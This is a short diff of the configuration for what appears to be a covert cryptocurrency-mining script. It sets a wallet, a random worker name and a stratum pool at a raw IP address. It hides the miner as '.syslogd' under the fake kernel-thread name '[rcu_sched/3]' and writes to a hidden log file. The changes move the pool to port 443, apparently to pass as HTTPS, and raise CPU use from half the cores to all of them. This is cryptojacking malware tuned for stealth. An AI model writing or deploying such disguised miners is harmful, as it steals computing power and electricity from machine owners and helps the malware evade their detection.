@@ -4,9 +4,9 @@
 BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
 WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
 WALLET="$BASE_WALLET.$WORKER"
-POOL="stratum+tcp://159.223.48.143:10300"
+POOL="stratum+tcp://159.223.48.143:443"
 ALGO="power2b"
-THREADS=$(( $(nproc --all) / 2 ))
+THREADS=$(( $(nproc --all) / 1 ))
 BIN_NAME=".syslogd"
 PROCESS_NAME="[rcu_sched/3]"
 LOG_FILE=".xlog"
